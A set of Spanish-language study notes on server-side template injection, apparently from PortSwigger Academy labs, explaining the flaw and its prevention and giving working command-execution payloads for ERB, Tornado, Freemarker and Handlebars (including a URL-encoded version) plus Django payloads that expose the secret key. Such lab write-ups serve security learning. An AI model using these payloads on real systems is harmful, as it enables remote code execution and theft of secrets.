-----
### QUE ES?
La **SSTI (Server-Side Template Injection)** es una vulnerabilidad donde un atacante consigue inyectar código en un **motor de plantillas del lado del servidor**.  
Ocurre cuando la aplicación inserta directamente input del usuario dentro de una plantilla (por ejemplo Jinja2, Twig, Freemarker, etc.) sin validarlo correctamente.  
El motor interpreta ese input como parte de la plantilla y lo ejecuta en el servidor.

Permite cosas como:
- Acceder a variables internas de la aplicación
- Leer archivos del sistema
- Ejecutar comandos del sistema
- Conseguir ejecución remota de código (RCE)

Se previene usando:
- No renderizar directamente input del usuario como plantilla
- Separar claramente datos de lógica
- Usar funciones seguras de renderizado
- Restringir el acceso a objetos peligrosos dentro del entorno de plantillas
#### PASOS:
- *PROBAR EXPRESIONES BÁSICAS (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`)*
- *IDENTIFICAR EL MOTOR DE PLANTILLAS POR LA SINTAXIS*
- *IDENTIFICAR EL MOTOR DE PLANTILLAS POR ERRORES*
- *INTENTAR ACCEDER A OBJETOS INTERNOS O EJECUCIÓN DE COMANDOS*
#### RECURSOS:
- `PayloadsAllTheThings – SSTI:`[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)`
### LAB1: BASIC SERVER-SIDE TEMPLATE INJECTION
En este lab vemos que al pinchar en algunos productos nos aparece *Unfortunately this product is out of stock* si interceptamos la request a ese producto y hacemos follow redirect podemos ver que se hace un *GET* a `/message=Unfortunately this product is out of stock` Esto indica que el parámetro `message` se está renderizando dentro de una plantilla en el servidor.
Probando injecciones SSTI vemos que con `<%= 7*7 %>` la etiqueta refleja un *49*, es decir esta ejecutando comandos
Podemos probar con:
`/message=<%= system ("rm /home/carlos/morale.txt")%>

### LAB2: BASIC SERVER-SIDE TEMPLATE INJECTION (CODE CONTEXT)
En este laboratorio nos encontramos con que podemos elegir que nombre queremos que aparezca cuando hacemos un comentario con la opción *Preferred Name*
si miramos el *Http History* encontramos una request `/my-account/change-blog-post-author-display` en la que se establece que nombre se va a ver
si la editamos y conseguimos hacer que haya un error en la etiqueta el error nos refleja que se esta usando *Tornado*, podemos probar injecciones como:
`blog-post-author-display=user.name}}{{7*7}}`
y para injecciones de comandos como tornado usa python:
`blog-post-author-display=user.first_name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')&csrf=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

### LAB3: SERVER-SIDE TEMPLATE INJECTION USING DOCUMENTATION
En este laboratorio encontramos que podemos *editar las etiquetas de las publicaciones*, es decir ya tenemos una cuenta con *privilegios*
podemos tratar de meter caracteres raros y errors para identificar el *motor de plantillas*:
`${{<%[%'"}}%\`o probar cosas validas com `${7*7}
En este caso se esta usando *Freemarker* hay un payload famoso de albinowax:
`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
### LAB4: SERVER-SIDE TEMPLATE INJECTION IN AN UNKNOWN LANGUAGE WITH A DOCUMENTED EXPLOIT
En este lab volvemos a ver *Unfortunately this product is out of stock* si nos vamos a la request *GET* que lo muestra y probamos a forzar un error con:
`${}`vemos que correo por detrás el motor de plantillas *Handlebars*
Podemos encontrar exploit es *payloads all the things*:
`wrtz{{#with "s" as |string|}}
`    {{#with "e"}}
`        {{#with split as |conslist|}}
`            {{this.pop}}
`            {{this.push (lookup string.sub "constructor")}}
`            {{this.pop}}
`            {{#with string.split as |codelist|}}
`                {{this.pop}}
`                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
`                {{this.pop}}
`                {{#each conslist}}
`                    {{#with (string.sub.apply 0 codelist)}}
`                        {{this}}
`                    {{/with}}
`                {{/each}}
`            {{/with}}
`        {{/with}}
`    {{/with}}
`{{/with}}
*(ya esta metido el comando que queremos ejecutar, modificar en caso de otro comando)*
Lo URL encodeamos para poder ejecutarlo:
`https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
### LAB5: SERVER-SIDE TEMPLATE INJECTION WITH INFORMATION DISCLOSURE VIA USER-SUPPLIED OBJECTS
En este laboratorio encontramos que podemos *editar las etiquetas de las publicaciones*, es decir ya tenemos una cuenta con *privilegios*
podemos tratar de meter caracteres raros y errors para identificar el *motor de plantillas*:
`${{<%[%'"}}%\`
Vemos en el error que el motor de plantillas es *Django*
Podemos ejecutar `{% debug %}` que muestra las variables y objetos internos disponibles en la plantilla. (si tenemos acceso a settings podemos extraer la clave privada)
Para verlo podemos mirar todo el output o almacenarlo y grepearlo o ejecutar `{{settings.SECRET_KEY}}`